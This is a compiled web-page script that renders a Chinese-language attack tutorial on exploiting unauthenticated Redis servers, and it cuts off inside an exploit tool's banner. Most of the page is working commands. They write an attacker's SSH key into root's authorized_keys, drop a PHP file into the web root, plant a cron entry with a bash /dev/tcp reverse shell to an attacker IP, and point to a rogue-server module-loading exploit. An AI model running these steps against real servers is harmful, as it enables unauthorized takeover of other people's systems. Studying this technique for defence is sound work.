(window.webpackJsonp=window.webpackJsonp||[]).push([[9],{1021:function(s,a,t){s.exports=t.p+"assets/img/1628511265889-a89c273a-fa98-458c-b7d0-8a61b9098cc2-20220415143203556.794335ca.png"},1022:function(s,a,t){s.exports=t.p+"assets/img/1628511872365-61010be1-642a-4a70-8390-1de94a771e5b-20220415143203424.c66d4dbb.png"},1023:function(s,a,t){s.exports=t.p+"assets/img/1628511715038-57addcaa-bed5-4db8-a030-acafc228ba79-20220415143203457.eef9b57a.png"},1024:function(s,a,t){s.exports=t.p+"assets/img/1628512967608-9d62672c-9db3-4b07-94ad-70d03edf02b7-20220415143203434.9897afb6.png"},1025:function(s,a,t){s.exports=t.p+"assets/img/1628513275098-e5bcd6c4-3c19-4aaa-b2c1-90bd3d3b4a4e-20220415143203451.151e7ac3.png"},1026:function(s,a,t){s.exports=t.p+"assets/img/1628514409894-848f4f59-3b45-449a-8566-c204aed32354-20220415143203297.fba85c78.png"},1027:function(s,a,t){s.exports=t.p+"assets/img/1628515307073-5d1f3553-587e-476a-9556-beb3c9eb54bf-20220415143203556.3c3cade0.png"},1028:function(s,a,t){s.exports=t.p+"assets/img/1628515979062-1d027d69-3100-4eb9-9496-43b0b15a7768-20220415143203717.9a8e8d57.png"},1029:function(s,a,t){s.exports=t.p+"assets/img/1628603729549-61622428-de4c-4dbf-abdb-7ceb5c0d6240-20220415143203493.808174aa.png"},1030:function(s,a,t){s.exports=t.p+"assets/img/1628608226504-a9981cc4-1dae-4c85-9468-39bd3f030305-20220415143203642.bd3538c3.png"},1031:function(s,a,t){s.exports=t.p+"assets/img/1628608233667-192fed23-55a2-43a8-88df-75cc7d9d0b9b-20220415143203584.357b75de.png"},1032:function(s,a,t){s.exports=t.p+"assets/img/1628609553023-5e320f71-cea1-4ade-ad72-f1e0f51f7f11-20220415143203567.5bb58bce.png"},1033:function(s,a,t){s.exports=t.p+"assets/img/1628609873998-b83c9a14-4307-45fb-8c50-f46b79d85f86-20220415143203676.f3e64db5.png"},1034:function(s,a,t){s.exports=t.p+"assets/img/1628609802263-2105839f-6645-428b-82d4-bbb75b3dadb9-20220415143203681.8b806788.png"},1035:function(s,a,t){s.exports=t.p+"assets/img/1628610432546-2e313488-1ab1-42f2-bf37-fb074693c30a-20220415151326919.eba8b536.png"},1036:function(s,a,t){s.exports=t.p+"assets/img/1628682645780-adbda105-6e56-481d-a4c9-b34e6bd5908b-20220415143203710.60230d0b.png"},2773:function(s,a,t){"use strict";t.r(a);var e=t(64),r=Object(e.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"redis-6379端口"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#redis-6379端口"}},[s._v("#")]),s._v(" Redis 6379端口")]),s._v(" "),a("h2",{attrs:{id:"关于"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#关于"}},[s._v("#")]),s._v(" 关于")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上")]),a("br"),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。")]),a("br"),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器")]),a("br"),s._v(" "),a("h2",{attrs:{id:"攻击方法"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#攻击方法"}},[s._v("#")]),s._v(" 攻击方法")]),s._v(" "),a("p",[s._v("要成功的利用Redis未授权访问的漏洞需要如下几点")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("redis服务以root账户运行")]),a("br"),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("redis无密码或弱密码进行认证")]),a("br"),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("redis监听在0.0.0.0公网上或内网中")]),a("br"),s._v(" "),a("p",[s._v("首先可以使用 Nmap的检测脚本 对 Redis进行未授权检测")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[s._v("nmap "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("A")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("p "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6379")]),s._v(" –script redis"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("info "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".126")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("也可以使用其他工具进行扫描")]),s._v(" "),a("p",[a("img",{attrs:{src:t(1021),alt:"img"}})]),s._v(" "),a("p",[s._v("连接数据库查看 info, 确定未授权访问")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[s._v("redis"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("cli "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("h "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".126")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("p "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6379")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:t(1022),alt:"img"}})]),s._v(" "),a("p",[a("img",{attrs:{src:t(1023),alt:"img"}})]),s._v(" "),a("h2",{attrs:{id:"linux-获取权限"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#linux-获取权限"}},[s._v("#")]),s._v(" Linux 获取权限")]),s._v(" "),a("h3",{attrs:{id:"ssh公钥"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ssh公钥"}},[s._v("#")]),s._v(" SSH公钥")]),s._v(" "),a("p",[s._v("生成密钥在攻击机中")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[s._v("ssh"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("keygen "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("t rsa\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:t(1024),alt:"img"}})]),s._v(" "),a("p",[s._v("将公钥导入key.txt文件（前后用\\n\\n换行，避免和Redis里其他缓存数据混合）")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("e "),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"\\n\\n"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" cat id_rsa"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("pub"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("e "),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"\\n\\n"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" key"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("txt\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:t(1025),alt:"img"}})]),s._v(" "),a("p",[s._v("再把 key.txt 文件内容写入目标主机的缓冲里")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[s._v("cat key"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("txt")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("redis")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("cli "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("h "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".126")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("x set test \n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:t(1026),alt:"img"}}),s._v("\n再通过设置参数，写入指定文件")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("root💀kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("~")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("ssh"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# redis-cli -h 192.168.0.126 -p 6379")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".126")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6379")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" config set dir "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("root"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("ssh\n"),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("OK")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".126")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6379")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" config set dbfilename authorized_keys\n"),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("OK")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".126")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6379")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" keys "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"test"')]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".126")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6379")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" get test\n"),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"\\n\\n\\nssh-rsa xxxxxxxxxxxx \\n\\n\\n\\n"')]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".126")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6379")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" save\n"),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("OK")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".126")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6379")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" \n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br")])]),a("p",[a("img",{attrs:{src:t(1027),alt:"img"}})]),s._v(" "),a("ul",[a("li",[s._v("✅如上则为成功写入SSH密钥文件，攻击机可无需密码远程连接目标主机SSH")])]),s._v(" "),a("h3",{attrs:{id:"webshell"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#webshell"}},[s._v("#")]),s._v(" WebShell")]),s._v(" "),a("p",[s._v("当SSH不允许远程登录时，也可以通过写入 Web目录控制目标主机")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[s._v('┌──(root💀kali)-[~/.ssh]\n└─# redis-cli -h 192.168.0.126 -p 6379\n192.168.0.126:6379> config set dir /var/www/html\nOK\n192.168.0.126:6379> config set dbfilename xxx.php\nOK\n192.168.0.126:6379> set web "\\r\\n\\r\\n'),a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?php")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("phpinfo")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("?>")])]),s._v('\\r\\n\\r\\n"\nOK\n192.168.0.126:6379> save\nOK\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br")])]),a("p",[a("img",{attrs:{src:t(1028),alt:"img"}})]),s._v(" "),a("h3",{attrs:{id:"定时任务"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#定时任务"}},[s._v("#")]),s._v(" 定时任务")]),s._v(" "),a("p",[s._v("也可以通过写入定时任务反弹Shell，获取权限")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("攻击机监听端口 ")]),a("br"),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("nc -lvvp 9999")]),a("br"),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".126")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6379")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" set test2 "),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"\\n\\n*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.0.140/9999 0>&1\\n\\n"')]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("OK")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".126")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6379")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" config set dir "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("var")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("spool"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("cron\n"),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("OK")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".126")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6379")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" config set dbfilename root\n"),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("OK")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".126")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6379")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" save\n"),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("OK")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".126")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6379")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" \n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br")])]),a("p",[a("img",{attrs:{src:t(1029),alt:"img"}})]),s._v(" "),a("h3",{attrs:{id:"主从复制"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#主从复制"}},[s._v("#")]),s._v(" 主从复制")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。")]),a("br"),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机")]),a("br"),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式")]),a("br"),s._v(" "),a("p",[s._v("Redis未授权访问在4.x/5.0.5以前版本，我们可以使用主/从模式加载远程模块，通过动态链接库的方式执行任意命令。")]),s._v(" "),a("p",[s._v("关于漏洞原理请查看"),a("a",{attrs:{href:"https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf",target:"_blank",rel:"noopener noreferrer"}},[s._v("Pavel Toporkov的分享"),a("OutboundLink")],1)]),s._v(" "),a("p",[s._v("漏洞利用脚本: "),a("a",{attrs:{href:"https://github.com/n0b0dyCN/redis-rogue-server",target:"_blank",rel:"noopener noreferrer"}},[s._v("n0b0dyCN/redis-rogue-server"),a("OutboundLink")],1)]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("➜ ./redis-rogue-server.py "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-h")]),s._v("\n______         _ _      ______                         _____                          \n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" ___ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("       "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("_"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("     "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" ___ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("                       /  ___"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("                         \n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("_/ /___  __"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("_ ___  "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("_/ /___   __ _ _   _  ___  "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")]),s._v("--.  ___ _ ____   _____ _ __ \n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("    // _ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("/ _"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")])]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" / __"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("    // _ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(" / _"),a("span",{pre:!0,attrs:{class:"token variable"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("/ _ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")])]),s._v("--. "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("/ _ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'__\\ \\ / / _ \\ '")]),s._v("__"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("  __/ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("__ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("_"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("  __/ /"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("__/ /  __/ "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("   "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(" V /  __/ "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("   \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("_"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("___"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("__,_"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("___/ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token 